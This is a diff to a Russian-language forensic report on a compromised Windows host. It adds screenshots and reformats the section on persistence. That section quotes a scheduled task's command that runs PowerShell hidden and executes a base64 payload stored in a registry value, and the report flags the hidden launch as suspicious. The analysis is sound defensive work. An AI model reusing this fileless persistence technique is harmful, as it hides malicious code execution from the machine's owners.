@@ -347,6 +347,10 @@ Flags: CommitCharge: 1, PrivateMemory: 1, Protection: 6
 При этом, появление ярлыков этих ресурсов по 
 
 
+<img width="2156" height="1235" alt="image" src="https://github.com/user-attachments/assets/a9303b7b-3f6a-45fa-9823-8bf34dbcca2d" />
+
+<img width="2207" height="1232" alt="image" src="https://github.com/user-attachments/assets/c6ba791b-49d7-4f34-9451-0a071579c9a0" />
+
   
 ## 2.5.	Закрепление (Persistence)
 
@@ -362,12 +366,12 @@ Flags: CommitCharge: 1, PrivateMemory: 1, Protection: 6
 
 В качестве вспомогательной техники используется технология Exploitation for Defense Evasion (T1211) - за счет нее был обновлен Defender.  
 Основные показатели:  
-Дата и время: 2019-03-10, 05:56:46  
-Автор изменений: Support  
-Триггер привязан к календарю: 2019-03-10, 09:00:00  
-Сканирование запланировано в ежедневном режиме
-Процесс запускается консольной команой  
-<Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command> <Arguments>-NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"</Arguments>  
+* Дата и время: 2019-03-10, 05:56:46  
+* Автор изменений: Support  
+* Триггер привязан к календарю: 2019-03-10, 09:00:00  
+* Сканирование запланировано в ежедневном режиме
+* Процесс запускается консольной команой:    
+*<Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command> <Arguments>-NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"</Arguments>*   
 Подозрительным выглядит запуск в скрытом режиме.  
 В настройках задач обнаруживается запланированная работа -RestrictPriviligesScan  
   
